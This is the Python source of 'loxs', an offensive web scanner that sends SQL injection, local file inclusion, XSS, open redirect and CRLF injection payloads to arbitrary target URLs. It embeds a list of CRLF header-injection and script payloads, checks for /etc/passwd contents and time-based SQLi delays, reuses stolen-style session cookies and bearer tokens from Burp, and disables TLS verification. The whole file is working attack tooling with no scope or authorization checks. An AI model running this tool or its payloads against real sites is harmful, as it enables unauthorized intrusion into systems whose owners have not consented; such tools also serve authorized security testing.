#!/usr/bin/python3

VERSION = 'v3.0.0'

import os, sys, re, time, random, logging, argparse, concurrent.futures
import urllib, urllib.parse, urllib3, threading
from urllib.parse import (urlparse, urlsplit, urlunsplit,
                           parse_qs, urlencode)
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from threading import Lock

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from colorama import Fore, Style, init
from rich import print as rich_print
from rich.panel import Panel
from rich.console import Console
from packaging import version as pkg_version
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
from webdriver_manager.chrome import ChromeDriverManager

# ─────────────────────────────────────────────────────────────────────────────
# INIT
# ─────────────────────────────────────────────────────────────────────────────
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.disable(logging.CRITICAL)
console = Console()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/114.0.5735.198 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 Chrome/110.0.5481.65 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 Version/15.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
]

BANNER = r"""
     ____           ____  ___
    |    |    _____ \   \/  /  ______
    |    |   /     \ \     /  /  ___/
    |    |__(   O  / /     \  \___  \
    |_______/\____/ /___/\  \ /_____/
                          \_/
  LFI | SQLi | XSS | Open Redirect | CRLF
  Coffinxp · 1hehaq · HexSh1dow · AnonKryptiQuz · Naho · Hghost010 - 4m3rr0r
"""

# ─────────────────────────────────────────────────────────────────────────────
# ARGUMENT PARSER
# ─────────────────────────────────────────────────────────────────────────────
def parse_args():
    parser = argparse.ArgumentParser(
        prog='loxs',
        formatter_class=argparse.RawTextHelpFormatter,
        description=BANNER,
        epilog="""EXAMPLES:
  python3 loxs.py --sqli  -u "https://site.com/page?id=" -p sqli.txt -a auth.txt
  python3 loxs.py --xss   -l urls.txt -p xss.txt -t 10
  python3 loxs.py --lfi   -u "https://site.com/page?file=" -p lfi.txt --lfi-patterns "root:,/bin/bash"
  python3 loxs.py --or    -l urls.txt -p redirect.txt -a burp_auth.txt
  python3 loxs.py --crlf  -u "https://site.com/page" -a auth.txt
  python3 loxs.py --crlf  -u "https://site.com/page" -p extra_crlf.txt
  python3 loxs.py --sqli  -u "https://site.com/?id=" -p sqli.txt --report out.html
  python3 loxs.py --update

AUTH FILE FORMAT (burp_auth.txt) — copy directly from Burp Suite Request tab:
  Cookie: PHPSESSID=abc123; remember_token=xyz789
  Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
  X-CSRF-Token: abcdef123456
  # lines starting with # are ignored
""")

    # ── Scanner (required, pick one) ──────────────────────────────────────────
    scan = parser.add_argument_group('Scanner  (required — pick one)')
    mx   = scan.add_mutually_exclusive_group(required=True)
    mx.add_argument('--lfi',    action='store_true', help='Local File Inclusion')
    mx.add_argument('--sqli',   action='store_true', help='SQL Injection')
    mx.add_argument('--xss',    action='store_true', help='Cross-Site Scripting')
    mx.add_argument('--or',     action='store_true', dest='open_redirect',
                                help='Open Redirect')
    mx.add_argument('--crlf',   action='store_true', help='CRLF Injection')
    mx.add_argument('--update', action='store_true', help='Update loxs from GitHub')

    # ── Target ────────────────────────────────────────────────────────────────
    tgt = parser.add_argument_group('Target  (one required except --update)')
    tmx = tgt.add_mutually_exclusive_group()
    tmx.add_argument('-u', '--url',  metavar='URL',
                     help='Single target URL  e.g. https://site.com/page?id=')
    tmx.add_argument('-l', '--list', metavar='FILE',
                     help='File of target URLs, one per line')

    # ── Payload ───────────────────────────────────────────────────────────────
    pay = parser.add_argument_group('Payload')
    pay.add_argument('-p', '--payload', metavar='FILE',
                     help='Payload wordlist — one entry per line\n'
                          '--crlf ships with built-in payloads, so -p is optional for it')

    # ── Auth ──────────────────────────────────────────────────────────────────
    auth = parser.add_argument_group('Auth')
    auth.add_argument('-a', '--auth', metavar='FILE',
                      help='Auth file with cookies / headers from Burp Suite\n'
                           'Format: "Header: value" one per line\n'
                           'Cookie header is parsed into individual cookies automatically\n'
                           'Works for both HTTP requests and Selenium browser sessions')

    # ── Tuning ────────────────────────────────────────────────────────────────
    tune = parser.add_argument_group('Tuning')
    tune.add_argument('-t', '--threads', type=int, default=5, metavar='N',
                      help='Concurrent threads (default: 5)')
    tune.add_argument('--timeout', type=float, default=10.0, metavar='SEC',
                      help='Request / alert timeout seconds (default: 10)')
    tune.add_argument('--lfi-patterns', metavar='PATTERNS', default='root:x:0:',
                      help='Comma-separated LFI success patterns (default: root:x:0:)')
    tune.add_argument('--report', metavar='FILE',
                      help='Auto-save HTML report to this path (skips interactive prompt)')

    args = parser.parse_args()

    # Validation — require target + payload for non-update, non-crlf modes
    if not args.update:
        if not args.url and not args.list:
            parser.error('Provide a target:  -u URL   or   -l FILE')
        if not args.crlf and not args.payload:
            parser.error('Provide a payload file:  -p FILE\n'
                         '(only --crlf can run without -p — it has built-in payloads)')
    return args


# ─────────────────────────────────────────────────────────────────────────────
# AUTH FILE LOADER
# ─────────────────────────────────────────────────────────────────────────────
def load_auth_file(path):
    """
    Parse a Burp Suite auth file.
    Returns (extra_headers dict, cookies dict).

    Supported line formats:
        Cookie: session=abc; token=xyz   →  split into cookies dict
        Authorization: Bearer eyJ...    →  added to headers dict
        X-CSRF-Token: abc123            →  added to headers dict
        # comment                       →  ignored
    """
    headers, cookies = {}, {}
    if not path:
        return headers, cookies
    if not os.path.isfile(path):
        print(Fore.RED + f"[!] Auth file not found: {path}")
        sys.exit(1)

    with open(path, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if ':' not in line:
                continue
            key, _, val = line.partition(':')
            key, val = key.strip(), val.strip()
            if key.lower() == 'cookie':
                # "Cookie: a=1; b=2"  →  {'a': '1', 'b': '2'}
                for pair in val.split(';'):
                    pair = pair.strip()
                    if '=' in pair:
                        k, _, v = pair.partition('=')
                        cookies[k.strip()] = v.strip()
                    elif pair:
                        cookies[pair] = ''
            else:
                headers[key] = val

    print(Fore.GREEN +
          f"[✓] Auth loaded — {len(cookies)} cookie(s), {len(headers)} extra header(s)")
    return headers, cookies


# ─────────────────────────────────────────────────────────────────────────────
# SHARED HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def rua():
    return random.choice(USER_AGENTS)

def retry_session(retries=3, backoff=0.3, forcelist=(500, 502, 504)):
    s = requests.Session()
    r = Retry(total=retries, read=retries, connect=retries,
              backoff_factor=backoff, status_forcelist=forcelist)
    s.mount('http://',  HTTPAdapter(max_retries=r))
    s.mount('https://', HTTPAdapter(max_retries=r))
    return s

def make_headers(extra=None):
    """Build request headers — random UA plus any auth headers."""
    h = {'User-Agent': rua()}
    if extra:
        h.update(extra)
    return h

def load_lines(path, label='file'):
    if not os.path.isfile(path):
        print(Fore.RED + f"[!] {label} not found: {path}")
        sys.exit(1)
    with open(path, encoding='utf-8') as f:
        return [l.strip() for l in f if l.strip()]

def load_urls(args):
    return [args.url] if args.url else load_lines(args.list, 'URL list')

def load_payloads(args):
    return load_lines(args.payload, 'payload file')

def url_box(url):
    msg = f" → Scanning: {url} "
    w   = max(len(msg) + 2, 52)
    print(Fore.YELLOW + "\n┌" + "─" * (w - 2) + "┐")
    print(Fore.YELLOW + f"│{msg.center(w - 2)}│")
    print(Fore.YELLOW + "└" + "─" * (w - 2) + "┘\n")

def print_summary(found, scanned, start):
    lines = [
        "→ Scan complete.",
        f"• Vulnerabilities found : {Fore.GREEN}{found}{Fore.YELLOW}",
        f"• Total URLs tested     : {scanned}",
        f"• Time elapsed          : {int(time.time() - start)}s",
    ]
    w = max(len(l.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for l in lines)
    print(Fore.YELLOW + "\n┌" + "─" * (w + 2) + "┐")
    for l in lines:
        plain = l.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
        print(Fore.YELLOW + f"│ {l}{' ' * (w - len(plain))} │")
    print(Fore.YELLOW + "└" + "─" * (w + 2) + "┘\n")


# ─────────────────────────────────────────────────────────────────────────────
# HTML REPORT
# ─────────────────────────────────────────────────────────────────────────────
def generate_report(scan_type, found, scanned, elapsed, vuln_urls):
    rate  = (found / scanned * 100) if scanned else 0
    items = "".join(
        f'<li class="vi"><a href="{u}" target="_blank">{u}</a></li>'
        for u in vuln_urls)
    return f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>Loxs Report — {scan_type}</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
:root{{--p:#ff7f50;--s:#6e44ff;--a:#5dc05d;--bg:#000;--box:rgba(0,20,40,.85)}}
body{{font-family:'Share Tech Mono',monospace;color:var(--p);background:var(--bg);
  background-image:linear-gradient(rgba(0,255,255,.07) 1px,transparent 1px),
  linear-gradient(90deg,rgba(0,255,255,.07) 1px,transparent 1px);
  background-size:20px 20px;margin:0;padding:0}}
.wrap{{max-width:940px;margin:2rem auto;padding:2rem;background:var(--box);
  border:1px solid var(--p);border-radius:10px;box-shadow:0 0 25px var(--p)}}
h1{{text-align:center;color:var(--s);text-shadow:0 0 12px var(--s);
  letter-spacing:4px;text-transform:uppercase;font-size:1.9rem;margin-bottom:1.5rem}}
h2{{color:var(--a);letter-spacing:2px;margin-top:2rem}}
.meta{{background:rgba(0,40,80,.6);padding:1.2rem 1.5rem;border-radius:8px;
  border:1px solid var(--p);margin-bottom:1.5rem}}
.row{{display:flex;justify-content:space-between;padding:.4rem 0;
  border-bottom:1px solid rgba(0,255,255,.2)}}
.row:last-child{{border:none}}
.lbl{{color:var(--a);font-weight:bold}} .val{{color:var(--p)}}
.bar-wrap{{height:18px;background:rgba(0,255,255,.1);border-radius:9px;
  overflow:hidden;margin:1rem 0}}
.bar{{height:100%;width:{rate:.1f}%;background:var(--s);box-shadow:0 0 8px var(--s)}}
.grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
  gap:1rem;margin-bottom:2rem}}
.card{{background:rgba(0,40,80,.6);border:1px solid var(--p);border-radius:8px;
  padding:1rem;text-align:center}}
.card-n{{font-size:1.9rem;font-weight:bold;color:var(--a)}}
ul{{list-style:none;padding:0;margin:0}}
.vi{{background:rgba(255,0,0,.15);border:1px solid #f00;color:#f00;
  padding:.8rem 1rem;margin-bottom:.8rem;border-radius:4px;
  word-break:break-all;position:relative}}
.vi::before{{content:"VULN";position:absolute;top:0;right:0;
  background:#f00;color:#000;font-size:.65rem;padding:.15rem .45rem}}
.vi a{{color:inherit;text-decoration:none}}
</style></head><body><div class="wrap">
<h1>Loxs Security Report</h1>
<div class="meta">
  <div class="row"><span class="lbl">Scan Type</span><span class="val">{scan_type}</span></div>
  <div class="row"><span class="lbl">Vulnerabilities Found</span><span class="val">{found}</span></div>
  <div class="row"><span class="lbl">URLs Scanned</span><span class="val">{scanned}</span></div>
  <div class="row"><span class="lbl">Duration</span><span class="val">{elapsed}s</span></div>
  <div class="row"><span class="lbl">Vuln Rate</span><span class="val">{rate:.1f}%</span></div>
</div>
<div class="bar-wrap"><div class="bar"></div></div>
<div class="grid">
  <div class="card"><div class="card-n">{found}</div><div>Vulnerabilities</div></div>
  <div class="card"><div class="card-n">{scanned}</div><div>URLs Tested</div></div>
  <div class="card"><div class="card-n">{elapsed}s</div><div>Duration</div></div>
  <div class="card"><div class="card-n">{rate:.1f}%</div><div>Vuln Rate</div></div>
</div>
<h2>Vulnerable URLs</h2>
<ul>{items}</ul>
</div></body></html>"""


def save_report(scan_type, found, scanned, start, vuln_urls, report_path=None):
    elapsed = int(time.time() - start)
    if report_path:
        fname = report_path
    else:
        if input(Fore.CYAN + "\n[?] Save HTML report? (y/n): ").strip().lower() != 'y':
            return
        fname = input(Fore.CYAN + "[?] Filename (Enter = auto): ").strip()
        if not fname:
            fname = (f"{scan_type.lower().replace(' ','_').replace('/','_')}"
                     f"_{int(time.time())}.html")
    if not fname.lower().endswith('.html'):
        fname += '.html'
    path = os.path.abspath(fname)
    try:
        with open(path, 'w', encoding='utf-8') as f:
            f.write(generate_report(scan_type, found, scanned, elapsed, vuln_urls))
        print(Fore.GREEN + f"[✓] Report saved → {path}")
    except Exception as e:
        print(Fore.RED + f"[✗] Could not save report: {e}")


# ─────────────────────────────────────────────────────────────────────────────
# ██  SQLi SCANNER  ██
# ─────────────────────────────────────────────────────────────────────────────
def run_sqli(args):
    rich_print(Panel(
        "[bold green]SQL Injection Scanner[/bold green]\n"
        f"[cyan]loxs {VERSION}[/cyan]",
        border_style="blue", expand=False))

    urls           = load_urls(args)
    payloads       = load_payloads(args)
    extra_h, cooks = load_auth_file(args.auth) if args.auth else ({}, {})

    print(Fore.CYAN +
          f"\n[i] Targets: {len(urls)}  |  Payloads: {len(payloads)}  "
          f"|  Threads: {args.threads}  |  Timeout: {args.timeout}s\n")

    vuln_urls = []
    scanned   = 0
    start     = time.time()

    def test(url, payload):
        target = f"{url}{payload}"
        t0     = time.time()
        try:
            requests.get(target,
                         headers=make_headers(extra_h),
                         cookies=cooks or None,
                         timeout=args.timeout,
                         verify=False)
        except Exception:
            pass
        elapsed = time.time() - t0
        # Time-based blind SQLi: response delayed >= 10s signals injection
        return target, round(elapsed, 2), elapsed >= 10

    for url in urls:
        url_box(url)
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futs = {ex.submit(test, url, pl): pl for pl in payloads}
            for fut in as_completed(futs):
                target, elapsed, vuln = fut.result()
                scanned += 1
                if vuln:
                    print(Fore.GREEN + f"[✓] VULNERABLE    {target}  [{elapsed}s]")
                    vuln_urls.append(target)
                else:
                    print(Fore.RED   + f"[✗] Not Vuln      {target}  [{elapsed}s]")

    print_summary(len(vuln_urls), scanned, start)
    save_report("SQL Injection (SQLi)", len(vuln_urls), scanned,
                start, vuln_urls, args.report)


# ─────────────────────────────────────────────────────────────────────────────
# ██  LFI SCANNER  ██
# ─────────────────────────────────────────────────────────────────────────────
def run_lfi(args):
    rich_print(Panel(
        "[bold green]Local File Inclusion Scanner[/bold green]\n"
        f"[cyan]loxs {VERSION}[/cyan]",
        border_style="blue", expand=False))

    urls           = load_urls(args)
    payloads       = load_payloads(args)
    extra_h, cooks = load_auth_file(args.auth) if args.auth else ({}, {})
    patterns       = [p.strip() for p in args.lfi_patterns.split(',')]

    print(Fore.CYAN +
          f"\n[i] Targets: {len(urls)}  |  Payloads: {len(payloads)}  "
          f"|  Threads: {args.threads}  |  Patterns: {patterns}\n")

    vuln_urls = []
    scanned   = 0
    start     = time.time()

    def test(url, payload):
        target = f"{url}{urllib.parse.quote(payload)}"
        t0     = time.time()
        try:
            resp    = requests.get(target,
                                   headers=make_headers(extra_h),
                                   cookies=cooks or None,
                                   timeout=args.timeout,
                                   verify=False)
            elapsed = round(time.time() - t0, 2)
            vuln    = (resp.status_code == 200 and
                       any(re.search(p, resp.text) for p in patterns))
        except Exception:
            elapsed = round(time.time() - t0, 2)
            vuln    = False
        return target, elapsed, vuln

    for url in urls:
        url_box(url)
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futs = {ex.submit(test, url, pl): pl for pl in payloads}
            for fut in as_completed(futs):
                target, elapsed, vuln = fut.result()
                scanned += 1
                if vuln:
                    print(Fore.GREEN + f"[✓] VULNERABLE    {target}  [{elapsed}s]")
                    vuln_urls.append(target)
                else:
                    print(Fore.RED   + f"[✗] Not Vuln      {target}  [{elapsed}s]")

    print_summary(len(vuln_urls), scanned, start)
    save_report("Local File Inclusion (LFI)", len(vuln_urls), scanned,
                start, vuln_urls, args.report)


# ─────────────────────────────────────────────────────────────────────────────
# ██  XSS SCANNER  ██
# ─────────────────────────────────────────────────────────────────────────────
def run_xss(args):
    rich_print(Panel(
        "[bold green]XSS Scanner[/bold green]\n"
        f"[cyan]loxs {VERSION}[/cyan]",
        border_style="blue", expand=False))

    urls           = load_urls(args)
    payloads       = load_payloads(args)
    extra_h, cooks = load_auth_file(args.auth) if args.auth else ({}, {})

    print(Fore.CYAN +
          f"\n[i] Targets: {len(urls)}  |  Payloads: {len(payloads)}  "
          f"|  Threads: {args.threads}  |  Alert timeout: {args.timeout}s\n")

    def gen_urls(url, payload):
        """
        Replicate original loxs behavior exactly:
        - If the URL already ends with '=' (stub like ?search=) → append payload directly
        - Otherwise inject into each query param via urlsplit
        - Also try fragment injection
        The key fix: never re-encode a URL that already has an encoded stub.
        """
        # Fast path: URL is a ready-made stub ending with '='
        # e.g. https://site.com/?search=
        # Just append the raw payload — this matches the original behavior.
        if url.endswith('='):
            return [url + payload]

        combos = []
        scheme, netloc, path, qs, frag = urlsplit(url)
        if not scheme:
            scheme = 'http'

        params = parse_qs(qs, keep_blank_values=True)

        if params:
            # Inject payload into each parameter individually
            for k in params:
                mp = params.copy()
                mp[k] = [payload]
                combos.append(urlunsplit((scheme, netloc, path,
                                          urlencode(mp, doseq=True), frag)))
        elif frag:
            combos.append(urlunsplit((scheme, netloc, path, qs, payload)))
        else:
            # No params, no frag — try both approaches
            combos.append(urlunsplit((scheme, netloc, path,
                                      urlencode({'test': payload}), '')))
            combos.append(urlunsplit((scheme, netloc, path, qs, payload)))

        return combos

    def make_driver():
        opts = Options()
        for flag in ["--headless", "--no-sandbox", "--disable-dev-shm-usage",
                     "--disable-extensions", "--disable-notifications"]:
            opts.add_argument(flag)
        opts.page_load_strategy = 'eager'
        drv = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()), options=opts)
        # Inject auth cookies into Selenium session
        if cooks:
            try:
                drv.get("about:blank")
                for name, val in cooks.items():
                    try:
                        drv.add_cookie({'name': name, 'value': val})
                    except Exception:
                        pass
            except Exception:
                pass
        return drv

    driver_pool = Queue()
    driver_lock = Lock()

    def get_drv():
        try:
            return driver_pool.get_nowait()
        except Exception:
            with driver_lock:
                return make_driver()

    def ret_drv(d):
        driver_pool.put(d)

    # Pre-warm a small pool
    for _ in range(min(3, args.threads)):
        driver_pool.put(make_driver())

    vuln_urls = []
    scanned   = [0]
    start     = time.time()

    def check(url, payload):
        drv = get_drv()
        try:
            for pu in gen_urls(url, payload):
                try:
                    drv.get(pu)
                    scanned[0] += 1
                    try:
                        alert = WebDriverWait(drv, args.timeout).until(
                            EC.alert_is_present())
                        txt = alert.text
                        alert.accept()
                        if txt is not None:
                            print(Fore.GREEN +
                                  f"[✓] VULNERABLE    {pu}  [alert: {txt!r}]")
                            vuln_urls.append(pu)
                            return
                    except TimeoutException:
                        print(Fore.RED + f"[✗] Not Vuln      {pu}")
                except UnexpectedAlertPresentException:
                    pass
        finally:
            ret_drv(drv)

    for url in urls:
        url_box(url)
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futs = [ex.submit(check, url, pl) for pl in payloads]
            for fut in as_completed(futs):
                try:
                    fut.result(timeout=args.timeout + 5)
                except Exception as e:
                    print(Fore.RED + f"[!] Error: {e}")

    # Clean up driver pool
    while not driver_pool.empty():
        try:
            driver_pool.get_nowait().quit()
        except Exception:
            pass

    print_summary(len(vuln_urls), scanned[0], start)
    save_report("Cross-Site Scripting (XSS)", len(vuln_urls), scanned[0],
                start, vuln_urls, args.report)


# ─────────────────────────────────────────────────────────────────────────────
# ██  OPEN REDIRECT SCANNER  ██
# ─────────────────────────────────────────────────────────────────────────────
def run_or(args):
    rich_print(Panel(
        "[bold green]Open Redirect Scanner[/bold green]\n"
        f"[cyan]loxs {VERSION}[/cyan]",
        border_style="blue", expand=False))

    urls           = load_urls(args)
    payloads       = load_payloads(args)
    extra_h, cooks = load_auth_file(args.auth) if args.auth else ({}, {})

    print(Fore.CYAN +
          f"\n[i] Targets: {len(urls)}  |  Payloads: {len(payloads)}  "
          f"|  Threads: {args.threads}\n")

    def make_driver():
        opts = Options()
        for flag in ["--headless", "--no-sandbox", "--disable-dev-shm-usage",
                     "--disable-gpu", "--disable-extensions"]:
            opts.add_argument(flag)
        opts.page_load_strategy = 'eager'
        drv = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()), options=opts)
        drv.set_page_load_timeout(15)
        # Inject auth cookies into Selenium session
        if cooks:
            try:
                drv.get("about:blank")
                for name, val in cooks.items():
                    try:
                        drv.add_cookie({'name': name, 'value': val})
                    except Exception:
                        pass
            except Exception:
                pass
        return drv

    vuln_urls = []
    scanned   = 0
    start     = time.time()

    def test(test_url, param=None):
        drv = None
        try:
            drv = make_driver()
            print(Fore.YELLOW + f"[→] {param or 'path'}  {test_url}")
            drv.get(test_url)
            WebDriverWait(drv, 10).until(
                lambda d: d.execute_script('return document.readyState') == 'complete')
            if "google.com" in drv.current_url.lower():
                print(Fore.GREEN + f"[✓] VULNERABLE    {test_url}")
                vuln_urls.append(test_url)
                return True
            print(Fore.RED + f"[✗] Not Vuln      {test_url}")
            return False
        except Exception as e:
            print(Fore.RED + f"[!] Error: {str(e).splitlines()[0]}")
            return False
        finally:
            if drv:
                try:
                    drv.quit()
                except Exception:
                    pass

    for url in urls:
        url_box(url)
        if not url.startswith('http'):
            url = 'https://' + url
        parsed = urllib.parse.urlparse(url)

        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futs = {}
            if not parsed.query:
                # No query params — append payload directly to path
                for pl in payloads:
                    new_url = urllib.parse.urlunparse(
                        parsed._replace(path=parsed.path + pl.strip()))
                    futs[ex.submit(test, new_url, 'path')] = new_url
            else:
                # Inject payload into each query parameter individually
                qp = {}
                for part in parsed.query.split('&'):
                    if '=' in part:
                        k, _, v = part.partition('=')
                        qp[k] = [v]
                for pl in payloads:
                    for param in qp:
                        mp = qp.copy()
                        mp[param] = [pl.strip()]
                        tu = urllib.parse.urlunparse(
                            parsed._replace(
                                query=urllib.parse.urlencode(mp, doseq=True)))
                        futs[ex.submit(test, tu, param)] = tu

            for fut in as_completed(futs):
                scanned += 1

    print_summary(len(vuln_urls), scanned, start)
    save_report("Open Redirect (OR)", len(vuln_urls), scanned,
                start, vuln_urls, args.report)


# ─────────────────────────────────────────────────────────────────────────────
# ██  CRLF SCANNER  ██
# ─────────────────────────────────────────────────────────────────────────────
def run_crlf(args):
    rich_print(Panel(
        "[bold green]CRLF Injection Scanner[/bold green]\n"
        f"[cyan]loxs {VERSION}[/cyan]",
        border_style="blue", expand=False))

    urls           = load_urls(args)
    extra_h, cooks = load_auth_file(args.auth) if args.auth else ({}, {})

    PATTERNS = [
        r'Set-Cookie\s*:\s*(?:.*?;\s*)?loxs=injected',
        r'Location\s*:\s*(?:https?://|//)?loxs\.pages\.dev',
        r'loxs-x',
    ]

    def built_in_payloads(url):
        domain = urlparse(url).netloc
        base = [
            "/%%0a0aSet-Cookie:loxs=injected",
            "/%0aSet-Cookie:loxs=injected;",
            "/%0aSet-Cookie:loxs=injected",
            "/%0d%0aLocation: http://loxs.pages.dev",
            "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
            "/%0d%0a%0d%0a<script>alert('LOXS')</script>;",
            "/%0d%0aSet-Cookie:loxs=injected;",
            "/%23%0aSet-Cookie:loxs=injected",
            "/%25%30%61Set-Cookie:loxs=injected",
            "/%2e%2e%2f%0d%0aSet-Cookie:loxs=injected",
            "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=injected;",
            "/%E5%98%8D%E5%98%8ALocation:loxs.pages.dev",
            "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
            "/%u000ASet-Cookie:loxs=injected;",
            "/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
            "/loxs.pages.dev/%2F..%0D%0Aloxs-x:loxs-x",
            f"/%0d%0aHost: {domain}%0d%0aCookie: loxs=injected%0d%0a%0d%0a",
        ]
        # Append user-supplied extra payloads if -p given
        extra = load_lines(args.payload, 'CRLF payload file') if args.payload else []
        return base + extra

    print(Fore.CYAN +
          f"\n[i] Targets: {len(urls)}  |  Threads: {args.threads}  "
          f"|  Timeout: {args.timeout}s"
          + (f"  |  Extra payloads: {args.payload}" if args.payload else "") + "\n")

    vuln_urls = []
    scanned   = 0
    start     = time.time()

    def test(url, payload):
        target  = f"{url}{payload}"
        headers = make_headers(extra_h)
        headers.update({'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'close'})
        t0 = time.time()
        try:
            sess = retry_session()
            resp = sess.get(target,
                            headers=headers,
                            cookies=cooks or None,
                            allow_redirects=False,
                            verify=False,
                            timeout=args.timeout)
            elapsed = round(time.time() - t0, 2)
            vuln, details = False, []
            for hk, hv in resp.headers.items():
                if any(re.search(p, f"{hk}: {hv}", re.I) for p in PATTERNS):
                    vuln = True
                    details.append(f"Header → {hk}: {hv}")
            if any(re.search(p, resp.text, re.I) for p in PATTERNS):
                vuln = True
                details.append("Body injection detected")
            return target, elapsed, vuln, details
        except Exception as e:
            return target, round(time.time() - t0, 2), False, [str(e)]

    for url in urls:
        url_box(url)
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futs = {ex.submit(test, url, pl): pl for pl in built_in_payloads(url)}
            for fut in as_completed(futs):
                target, elapsed, vuln, details = fut.result()
                scanned += 1
                if vuln:
                    print(Fore.GREEN + f"[✓] VULNERABLE    {target}  [{elapsed}s]")
                    for d in details:
                        print(Fore.YELLOW + f"    ↪ {d}")
                    vuln_urls.append(target)
                else:
                    print(Fore.RED + f"[✗] Not Vuln      {target}  [{elapsed}s]")

    print_summary(len(vuln_urls), scanned, start)
    save_report("CRLF Injection", len(vuln_urls), scanned,
                start, vuln_urls, args.report)


# ─────────────────────────────────────────────────────────────────────────────
# ██  UPDATE  ██
# ─────────────────────────────────────────────────────────────────────────────
def run_update():
    rich_print(Panel("[bold green]LOXS Updater[/bold green]",
                     border_style="blue", expand=False))
    try:
        r = requests.get(
            "https://api.github.com/repos/coffinxp/loxs/releases/latest",
            timeout=10)
        r.raise_for_status()
        latest = r.json()['tag_name']
        if pkg_version.parse(latest.lstrip('v')) > pkg_version.parse(VERSION.lstrip('v')):
            print(Fore.GREEN + f"[✓] New version: {latest}  (current: {VERSION})")
            if input("[?] Update now? (y/n): ").strip().lower() == 'y':
                dl = r.json()['assets'][0]['browser_download_url']
                print(Fore.CYAN + f"[i] Downloading {dl} …")
                with requests.get(dl, stream=True, timeout=60) as resp:
                    with open(__file__, 'wb') as f:
                        for chunk in resp.iter_content(1024):
                            f.write(chunk)
                print(Fore.GREEN + "[✓] Update complete — please restart loxs.")
            else:
                print(Fore.YELLOW + "[i] Update cancelled.")
        else:
            print(Fore.GREEN + f"[✓] Already up to date ({VERSION})")
    except Exception as e:
        print(Fore.RED + f"[!] Update failed: {e}")


# ─────────────────────────────────────────────────────────────────────────────
# ██  ENTRY POINT  ██
# ─────────────────────────────────────────────────────────────────────────────
def main():
    args = parse_args()
    os.system('cls' if os.name == 'nt' else 'clear')

    if args.update:        run_update();  return
    if args.sqli:          run_sqli(args); return
    if args.lfi:           run_lfi(args);  return
    if args.xss:           run_xss(args);  return
    if args.open_redirect: run_or(args);   return
    if args.crlf:          run_crlf(args); return


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted.")
        sys.exit(0)
